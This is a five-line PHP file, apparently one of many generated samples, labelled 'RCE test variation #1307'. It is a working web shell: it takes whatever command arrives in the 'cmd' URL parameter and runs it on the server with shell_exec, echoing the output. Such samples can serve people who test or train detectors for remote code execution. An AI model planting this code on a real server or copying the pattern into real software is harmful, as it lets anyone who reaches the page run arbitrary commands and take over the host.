<?php
// RCE test variation #1307
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>